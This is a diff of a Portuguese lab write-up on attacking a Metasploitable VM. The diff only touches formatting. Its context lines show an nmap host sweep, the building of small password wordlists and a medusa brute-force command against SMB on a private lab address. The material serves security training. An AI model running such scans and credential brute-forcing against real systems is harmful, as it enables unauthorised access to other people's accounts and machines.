@@ -33,9 +33,9 @@ Solução: Removi a controladora SATA e adicionei o disco a uma Controladora IDE
 Reconhecimento de Rede:
 Utilizei o nmap para identificar o IP do alvo e os serviços ativos:
 
-=========================================
+-----------------------------------------
 nmap -v -sn 192.168.56.100-200 | grep 192 
-=========================================
+-----------------------------------------
 
 Três resultados foram encontrados:
 
@@ -114,11 +114,13 @@ O serviço utiliza um sistema simples de login, pede um usuário e uma senha, qu
 Da mesma forma que no FTP, criaremos duas wordlists para uso do brute force.
 
 Para usuários:
+
 -------------------------------------------------
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 -------------------------------------------------
 
 Para senhas:
+
 -------------------------------------------------------
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt  
 -------------------------------------------------------
@@ -152,16 +154,19 @@ O Metasploitable utiliza o SMBv1, uma versão extremamente antiga e insegura que
 Vamos novamente criar wordlists para Brute Force:
 
 Para usuários:
+
 -------------------------------------------------
 echo -e "user\nmsfadmin\nservice" > smb_users.txt
 -------------------------------------------------
 
 Para senhas:
+
 -------------------------------------------------------------------
 echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
 -------------------------------------------------------------------
 
 Com o medusa, realizamos o ataque ao SMB:
+
 ---------------------------------------------------------------------------------
 medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 ---------------------------------------------------------------------------------
